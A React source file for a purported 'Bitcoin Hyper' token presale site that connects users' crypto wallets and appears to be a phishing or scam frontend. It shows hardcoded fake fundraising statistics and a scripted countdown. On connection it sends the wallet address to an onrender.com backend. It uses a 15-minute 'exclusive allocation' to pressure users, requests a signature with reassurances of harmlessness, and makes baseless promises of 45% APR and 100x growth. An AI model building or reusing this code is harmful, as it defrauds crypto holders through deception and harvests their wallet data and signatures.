import React, { useState, useEffect } from 'react';
import ReactDOM from 'react-dom/client';
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { 
  WagmiProvider, 
  createConfig, 
  http,  
  useAccount, 
  useDisconnect,
  useSignMessage
} from "wagmi";
import { 
  mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
  fantom, base, linea
} from "wagmi/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import './App.css';

// Create query client
const queryClient = new QueryClient();

// Supported chains for presale
const allChains = [
  mainnet, polygon, bsc, arbitrum, optimism, avalanche,
  fantom, base, linea
];

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";

// Production backend URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org"),
      [linea.id]: http("https://rpc.linea.build")
    }
  })
);

// Custom fetch function
const apiFetch = async (url, options = {}) => {
  const defaultOptions = {
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
    },
    mode: 'cors',
    credentials: 'omit'
  };

  try {
    const response = await fetch(url, { ...defaultOptions, ...options });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    return await response.json();
  } catch (error) {
    console.error('API Fetch Error:', error);
    throw error;
  }
};

// Modal Components
const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="modal-shimmer"></div>
        
        <button className="modal-close" onClick={onClose}>
          ✕
        </button>
        
        <div className="modal-header">
          <div className="modal-icon animated-shake">
            ⚠️
          </div>
          <h2 className="modal-title">
            Wallet Analysis Required
          </h2>
          <p className="modal-subtitle">
            Additional verification needed for presale access
          </p>
        </div>
        
        <div className="modal-body">
          <div className="status-card red">
            <div className="status-icon">🔍</div>
            <div className="status-content">
              <h3>Verification Incomplete</h3>
              <p>Your current wallet doesn't meet the eligibility criteria for the Bitcoin Hyper presale.</p>
            </div>
          </div>
          
          <div className="tips-container">
            <h4>💡 How to Qualify:</h4>
            <ul className="tips-list">
              <li>✅ Connect a wallet with transaction history (6+ months preferred)</li>
              <li>✅ Ensure sufficient balance for blockchain gas fees</li>
              <li>✅ Use wallets from established providers (MetaMask, Trust Wallet, etc.)</li>
              <li>✅ Wallet should have previous DeFi interactions</li>
              <li>✅ Minimum authentication threshold required</li>
            </ul>
          </div>
          
          <div className="professional-note">
            <div className="note-icon">ℹ️</div>
            <div className="note-content">
              <strong>Professional Note:</strong> This verification ensures the security and integrity of our presale distribution. We analyze wallet history to confirm authentic participation and prevent fraudulent activities.
            </div>
          </div>
        </div>
        
        <div className="modal-footer">
          <button 
            className="modal-button secondary"
            onClick={onRetry}
          >
            🔄 Try Different Wallet
          </button>
          <button 
            className="modal-button primary"
            onClick={onClose}
          >
            👌 Understood
          </button>
        </div>
      </div>
    </div>
  );
};

const EligibleModal = ({ isOpen, onClose, scanData, onClaim, loading }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content premium" onClick={(e) => e.stopPropagation()}>
        <div className="modal-shimmer gold"></div>
        
        <button className="modal-close" onClick={onClose}>
          ✕
        </button>
        
        <div className="modal-header">
          <div className="modal-icon animated-pulse">
            🎉
          </div>
          <h2 className="modal-title gold-text">
            Congratulations! You're Eligible!
          </h2>
          <p className="modal-subtitle">
            Secure Your Bitcoin Hyper Presale Allocation
          </p>
        </div>
        
        <div className="modal-body">
          <div className="allocation-card">
            <div className="allocation-badge">
              <span className="badge-icon">🏆</span>
              <span className="badge-text">EXCLUSIVE ALLOCATION</span>
            </div>
            
            <div className="allocation-details">
              <div className="allocation-item">
                <span className="label">Token Allocation</span>
                <span className="value large">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
              </div>
              <div className="allocation-item">
                <span className="label">Presale Price</span>
                <span className="value">$0.17 per BTH</span>
              </div>
              <div className="allocation-item">
                <span className="label">Total Value</span>
                <span className="value highlight">${scanData?.tokenAllocation?.valueUSD || '850'}</span>
              </div>
            </div>
          </div>
          
          <div className="benefits-container">
            <h4>✨ Exclusive Benefits:</h4>
            <div className="benefits-grid">
              <div className="benefit">
                <div className="benefit-icon">🚀</div>
                <div className="benefit-content">
                  <strong>Early Access</strong>
                  <small>Priority distribution</small>
                </div>
              </div>
              <div className="benefit">
                <div className="benefit-icon">🛡️</div>
                <div className="benefit-content">
                  <strong>Guaranteed Allocation</strong>
                  <small>Locked at presale price</small>
                </div>
              </div>
              <div className="benefit">
                <div className="benefit-icon">📈</div>
                <div className="benefit-content">
                  <strong>Potential Upside</strong>
                  <small>Launch price target: $0.85</small>
                </div>
              </div>
              <div className="benefit">
                <div className="benefit-icon">⚡</div>
                <div className="benefit-content">
                  <strong>Instant Vesting</strong>
                  <small>25% at TGE</small>
                </div>
              </div>
            </div>
          </div>
          
          <div className="urgent-callout">
            <div className="callout-icon">⏰</div>
            <div className="callout-content">
              <strong>Limited Time Offer!</strong> This exclusive allocation is reserved for you for the next 15 minutes. Other eligible participants are waiting in queue.
            </div>
          </div>
          
          <div className="security-note">
            <div className="security-icon">🔐</div>
            <div className="security-content">
              <strong>Secure Signature Required:</strong> The following signature only confirms your wallet ownership and participation intent. No transaction fees or permissions are required.
            </div>
          </div>
        </div>
        
        <div className="modal-footer">
          <button 
            className="modal-button secondary"
            onClick={onClose}
          >
            ⏳ Maybe Later
          </button>
          <button 
            className="modal-button primary gold"
            onClick={onClaim}
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="spinner"></span>
                Processing Claim...
              </>
            ) : (
              <>
                ✍️ SECURE MY {scanData?.tokenAllocation?.amount || '5,000'} BTH TOKENS
              </>
            )}
          </button>
        </div>
        
        <div className="modal-disclaimer">
          <small>By claiming, you agree to the terms and confirm you're not a citizen of restricted jurisdictions.</small>
        </div>
      </div>
    </div>
  );
};

const ClaimSuccessModal = ({ isOpen, onClose, claimData }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content success" onClick={(e) => e.stopPropagation()}>
        <div className="modal-shimmer success-glow"></div>
        
        <div className="modal-header">
          <div className="modal-icon animated-celebration">
            🎊
          </div>
          <h2 className="modal-title success-text">
            Claim Successful!
          </h2>
          <p className="modal-subtitle">
            Your Bitcoin Hyper Tokens Are Secured
          </p>
        </div>
        
        <div className="modal-body">
          <div className="confetti-container">
            {Array.from({ length: 50 }).map((_, i) => (
              <div key={i} className="confetti"></div>
            ))}
          </div>
          
          <div className="success-card">
            <div className="success-badge">
              <span className="badge-icon">✅</span>
              <span className="badge-text">ALLOCATION CONFIRMED</span>
            </div>
            
            <div className="success-details">
              <div className="detail-item">
                <span className="label">Claim ID</span>
                <span className="value mono">{claimData?.claimId}</span>
              </div>
              <div className="detail-item">
                <span className="label">Token Amount</span>
                <span className="value large">{claimData?.tokenAmount}</span>
              </div>
              <div className="detail-item">
                <span className="label">Transaction</span>
                <span className="value mono">{claimData?.txHash?.substring(0, 20)}...</span>
              </div>
              <div className="detail-item">
                <span className="label">Distribution</span>
                <span className="value">After Presale Completion</span>
              </div>
            </div>
          </div>
          
          <div className="next-steps">
            <h4>📋 What Happens Next:</h4>
            <ol className="steps-list">
              <li><strong>Token Lock:</strong> Your allocation is now locked at presale price</li>
              <li><strong>Distribution:</strong> Tokens will be distributed 24-48 hours after presale ends</li>
              <li><strong>Notification:</strong> You'll receive an email when tokens are sent</li>
              <li><strong>Trading:</strong> Tokens will be tradeable immediately on launch</li>
            </ol>
          </div>
          
          <div className="success-callout">
            <div className="callout-icon">🎯</div>
            <div className="callout-content">
              <strong>Welcome to Bitcoin Hyper!</strong> You're now part of the future of Bitcoin DeFi. Join our community for updates and announcements.
            </div>
          </div>
        </div>
        
        <div className="modal-footer">
          <button 
            className="modal-button primary success"
            onClick={onClose}
          >
            🎉 Awesome! Continue to Dashboard
          </button>
        </div>
      </div>
    </div>
  );
};

const BackendStatusIndicator = ({ status, onTest }) => {
  if (status === 'connected') return null;
  
  return (
    <div className="backend-status-indicator">
      <div className="backend-status-content">
        <div className="backend-status-icon">
          {status === 'error' ? '🔴' : '🟡'}
        </div>
        <div className="backend-status-text">
          <strong>Backend Status:</strong> {status === 'error' ? 'Connection Issue' : 'Checking...'}
        </div>
        <button 
          className="backend-status-button"
          onClick={onTest}
        >
          Test Connection
        </button>
      </div>
    </div>
  );
};

// Bitcoin Hyper Presale Component
function BitcoinHyperPresale() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessage } = useSignMessage();
  
  const [loading, setLoading] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [isEligible, setIsEligible] = useState(false);
  const [claimData, setClaimData] = useState(null);
  const [processing, setProcessing] = useState(false);
  const [backendStatus, setBackendStatus] = useState('checking');
  const [scanData, setScanData] = useState(null);
  
  // Modal states
  const [showNotEligibleModal, setShowNotEligibleModal] = useState(false);
  const [showEligibleModal, setShowEligibleModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  
  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  });
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  });
  
  // Initialize
  useEffect(() => {
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`, {
          mode: 'cors',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          }
        });
        
        if (response.ok) {
          const data = await response.json();
          console.log('Backend connected:', data);
          setBackendStatus('connected');
          
          // Start celebratory animation for successful connection
          triggerConnectionAnimation();
        } else {
          setBackendStatus('error');
        }
      } catch (error) {
        console.error('Backend test error:', error);
        setBackendStatus('error');
      }
    };
    
    testBackend();
    
    // Start countdown
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev;
        seconds--;
        
        if (seconds < 0) {
          seconds = 59;
          minutes--;
        }
        if (minutes < 0) {
          minutes = 59;
          hours--;
        }
        if (hours < 0) {
          hours = 23;
          days--;
        }
        if (days < 0) {
          clearInterval(interval);
          return { days: 0, hours: 0, minutes: 0, seconds: 0 };
        }
        
        return { days, hours, minutes, seconds };
      });
    }, 1000);
    
    return () => clearInterval(interval);
  }, []);

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address && backendStatus === 'connected') {
      triggerAutoScan();
    }
  }, [isConnected, address, backendStatus]);

  const triggerAutoScan = async () => {
    if (!address) return;
    
    setScanning(true);
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        mode: 'cors',
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setScanData(data.data);
        
        // Add delay for dramatic effect
        setTimeout(() => {
          setScanning(false);
          
          if (data.data.isEligible) {
            setIsEligible(true);
            
            // Show eligible modal after 1.5 seconds
            setTimeout(() => {
              setShowEligibleModal(true);
              triggerCelebrationAnimation();
            }, 1500);
          } else {
            setIsEligible(false);
            
            // Show not eligible modal after 1.5 seconds
            setTimeout(() => {
              setShowNotEligibleModal(true);
              triggerNotEligibleAnimation();
            }, 1500);
          }
        }, 2000);
      } else {
        throw new Error(data.error || 'Unknown error from backend');
      }
    } catch (error) {
      console.error('Scan error:', error);
      setScanning(false);
    }
  };

  const handleTokenClaim = async () => {
    if (!address || !isEligible || !scanData) return;
    
    setProcessing(true);
    
    try {
      const claimAmount = scanData.tokenAllocation.amount + " BTH";
      const claimValue = "$" + scanData.tokenAllocation.valueUSD;
      
      // Professional signing message
      const message = `Bitcoin Hyper Token Presale Authorization

🔐 Wallet Authentication: ${address}
🎯 Presale Allocation: ${claimAmount}
📊 Allocation Value: ${claimValue}

📅 Authorization Timestamp: ${new Date().toISOString()}
🌐 Network: Multi-chain Compatible Wallet

📝 Purpose of Signature:
I hereby confirm my participation in the Bitcoin Hyper token presale event and authorize the allocation of presale tokens to my verified wallet address. This signature serves solely as proof of wallet ownership and participation intent for the presale allocation process.

🔒 Security Note:
This is a read-only verification signature. It does NOT:
- Grant any permissions
- Authorize any transactions
- Transfer any tokens or funds
- Incur any gas fees

💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0
⚡ Next Generation Bitcoin Ecosystem`;

      const signature = await signMessage({ message });
      
      // Send to backend
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        mode: 'cors',
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message,
          claimAmount,
          claimValue
        })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setClaimData(data.data);
        setShowEligibleModal(false);
        setProcessing(false);
        
        // Show success modal after 1 second
        setTimeout(() => {
          setShowSuccessModal(true);
          triggerMegaCelebration();
          
          // Play success sound
          try {
            const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3');
            audio.volume = 0.3;
            audio.play().catch(() => {});
          } catch (e) {
            console.log('Audio play failed');
          }
        }, 1000);
      } else {
        throw new Error(data.error || 'Claim failed');
      }
    } catch (error) {
      console.error('Claim error:', error);
      setProcessing(false);
      alert(`Claim failed: ${error.message}`);
    }
  };

  const triggerConnectionAnimation = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    for (let i = 0; i < 20; i++) {
      const connection = document.createElement('div');
      connection.innerHTML = '🔗';
      connection.style.cssText = `
        position: absolute;
        font-size: ${Math.random() * 20 + 15}px;
        color: #10b981;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: connectionFloat ${Math.random() * 3 + 2}s ease-in-out infinite;
        z-index: 1000;
        opacity: 0.7;
      `;
      container.appendChild(connection);
    }
  };

  const triggerCelebrationAnimation = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    for (let i = 0; i < 20; i++) {
      const coin = document.createElement('div');
      coin.innerHTML = '💰';
      coin.style.cssText = `
        position: absolute;
        font-size: ${Math.random() * 30 + 20}px;
        color: #F7931A;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: coinFloat ${Math.random() * 2 + 1}s ease-in-out infinite;
        z-index: 1000;
        opacity: 0.8;
      `;
      container.appendChild(coin);
    }
  };

  const triggerNotEligibleAnimation = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    for (let i = 0; i < 15; i++) {
      const warning = document.createElement('div');
      warning.innerHTML = '⚠️';
      warning.style.cssText = `
        position: absolute;
        font-size: ${Math.random() * 25 + 20}px;
        color: #ef4444;
        top: ${Math.random() * 100}vh;
        left: ${Math.random() * 100}vw;
        animation: warningPulse ${Math.random() * 3 + 2}s ease-in-out infinite;
        z-index: 1000;
        opacity: 0.7;
      `;
      container.appendChild(warning);
    }
  };

  const triggerMegaCelebration = () => {
    const container = document.getElementById('animation-container');
    if (!container) return;
    
    container.innerHTML = '';
    
    const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'];
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div');
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 10 + 5}px;
          height: ${Math.random() * 10 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: ${Math.random() * 0.7 + 0.3};
          animation: megaConfetti ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9998;
        `;
        document.body.appendChild(confetti);
        
        setTimeout(() => {
          if (document.body.contains(confetti)) {
            document.body.removeChild(confetti);
          }
        }, 5000);
      }, i * 20);
    }
  };

  const testBackendManually = async () => {
    setBackendStatus('checking');
    
    try {
      const response = await fetch(`${BACKEND_API}/health`);
      
      if (response.ok) {
        const data = await response.json();
        console.log('Backend test successful:', data);
        setBackendStatus('connected');
        triggerConnectionAnimation();
      } else {
        throw new Error(`HTTP ${response.status}`);
      }
    } catch (error) {
      console.error('Manual test error:', error);
      setBackendStatus('error');
    }
  };

  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num;
  };

  return (
    <div className="app-container">
      {/* Backend Status Indicator */}
      <BackendStatusIndicator 
        status={backendStatus} 
        onTest={testBackendManually} 
      />
      
      {/* Animation container */}
      <div id="animation-container" className="animation-container"></div>
      
      {/* Modals */}
      <NotEligibleModal
        isOpen={showNotEligibleModal}
        onClose={() => setShowNotEligibleModal(false)}
        scanData={scanData}
        onRetry={() => {
          setShowNotEligibleModal(false);
          disconnect();
        }}
      />
      
      <EligibleModal
        isOpen={showEligibleModal}
        onClose={() => setShowEligibleModal(false)}
        scanData={scanData}
        onClaim={handleTokenClaim}
        loading={processing}
      />
      
      <ClaimSuccessModal
        isOpen={showSuccessModal}
        onClose={() => setShowSuccessModal(false)}
        claimData={claimData}
      />
      
      {/* Main content */}
      <div className="main-content">
        {/* Header */}
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon">
              ₿
            </div>
            <div>
              <h1 className="logo-title">
                BITCOIN HYPER
              </h1>
              <div className="logo-subtitle">
                OFFICIAL PRESALE LAUNCH
              </div>
            </div>
          </div>
          
          <div className="header-actions">
            {backendStatus === 'connected' && (
              <div className="backend-indicator connected">
                <span className="indicator-dot"></span>
                <span>Backend LIVE</span>
              </div>
            )}
            
            {isConnected && (
              <button
                onClick={() => disconnect()}
                className="disconnect-button"
              >
                Disconnect
              </button>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button
                  onClick={show}
                  className="connect-button"
                >
                  {isConnected ? 
                    (ensName || `${truncatedAddress}`) : 
                    'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        {/* Hero Section */}
        <section className="hero-section">
          <div className="hero-background"></div>
          
          <div className="hero-bitcoin">
            ₿
          </div>
          
          <h2 className="hero-title">
            NEXT GENERATION BITCOIN ECOSYSTEM
          </h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          {/* Countdown Timer */}
          <div className="countdown-timer">
            {Object.entries(countdown).map(([label, value]) => (
              <div key={label} className="countdown-item">
                <div className="countdown-value">
                  {formatNumber(value)}
                </div>
                <div className="countdown-label">
                  {label}
                </div>
              </div>
            ))}
          </div>
          
          {/* Presale Stats */}
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">
                  {value}
                </div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1')}
                </div>
              </div>
            ))}
          </div>
          
          {/* Progress Bar */}
          <div className="progress-container">
            <div className="progress-header">
              <span>Presale Progress</span>
              <span className="progress-percent">{presaleStats.progress}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{width: `${presaleStats.progress}%`}}
              >
                <div className="progress-glow"></div>
              </div>
            </div>
          </div>
          
          {/* Main Action Area */}
          {backendStatus === 'checking' ? (
            <div className="backend-checking-container">
              <div className="backend-checking-spinner"></div>
              <h3 className="backend-checking-title">
                Establishing Secure Connection...
              </h3>
              <p className="backend-checking-description">
                Connecting to Bitcoin Hyper backend systems
              </p>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="backend-error-container">
              <div className="backend-error-icon">🔴</div>
              <h3 className="backend-error-title">
                Connection Issue Detected
              </h3>
              <p className="backend-error-description">
                Please check your connection and try again
              </p>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">
                Connect Wallet to Start
              </h3>
              <p className="cta-description">
                Connect your wallet to check eligibility and secure your presale allocation
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button
                    onClick={show}
                    className="cta-button"
                  >
                    CONNECT WALLET
                  </button>
                )}
              </ConnectKitButton.Custom>
              <div className="backend-status-small">
                <span className="status-dot connected"></span>
                <span>Backend: Connected & Monitoring</span>
              </div>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">
                Analyzing Wallet...
              </h3>
              <p className="scanning-description">
                Checking eligibility across blockchain networks
              </p>
              <div className="scanning-dots">
                <span>.</span><span>.</span><span>.</span>
              </div>
            </div>
          ) : (
            <div className="status-summary">
              <div className={`status-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">
                  {isEligible ? '✅' : '⚠️'}
                </div>
                <div className="status-content">
                  <h3>{isEligible ? 'Eligible for Presale' : 'Verification Required'}</h3>
                  <p>{isEligible ? 
                    'Check the notification above to claim your allocation' : 
                    'Please see the modal for qualification requirements'
                  }</p>
                </div>
                <button 
                  className="status-button"
                  onClick={() => isEligible ? setShowEligibleModal(true) : setShowNotEligibleModal(true)}
                >
                  {isEligible ? 'View Allocation' : 'View Requirements'}
                </button>
              </div>
            </div>
          )}
        </section>

        {/* Features Section */}
        <section className="features-section">
          <h2 className="features-title">
            WHY BITCOIN HYPER?
          </h2>
          
          <div className="features-grid">
            {[
              {
                icon: '⚡',
                title: 'Lightning Fast',
                desc: 'Transaction speeds up to 100x faster than traditional Bitcoin'
              },
              {
                icon: '🛡️',
                title: 'Secure & Audited',
                desc: 'Fully audited smart contracts with multi-sig security'
              },
              {
                icon: '📈',
                title: 'High Yield',
                desc: 'Earn yields up to 45% APR through our DeFi ecosystem'
              },
              {
                icon: '🌐',
                title: 'Multi-Chain',
                desc: 'Native interoperability across Ethereum, BSC, Polygon, and more'
              },
              {
                icon: '🎯',
                title: 'Limited Supply',
                desc: 'Only 100M tokens ever minted. True scarcity model'
              },
              {
                icon: '🚀',
                title: 'Massive Growth',
                desc: 'Backed by top VCs with 100x growth potential'
              }
            ].map((feature, index) => (
              <div key={index} className="feature-card">
                <div className="feature-icon">
                  {feature.icon}
                </div>
                <h3 className="feature-title">
                  {feature.title}
                </h3>
                <p className="feature-description">
                  {feature.desc}
                </p>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer className="app-footer">
          <div className="footer-bitcoin">
            ₿
          </div>
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
              {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
            </span>
            <span>|</span>
            <span>Official Presale Platform</span>
          </div>
        </footer>
      </div>
    </div>
  );
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight",
  walletModal: "wide"
};

// Main App Component
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider 
          theme={customTheme}
          options={{
            hideQuestionMarkCTA: true,
            walletConnectName: 'WalletConnect',
            disableSiweRedirect: true,
            embedGoogleFonts: true,
            preferredWallets: ['metaMask', 'trust', 'coinbase', 'walletConnect', 'rainbow'],
            walletConnect: {
              showQrModal: true,
              qrModalOptions: {
                themeMode: 'dark',
                mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase']
              }
            }
          }}
        >
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

// ========== RENDER THE APP ==========
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);

export default App;
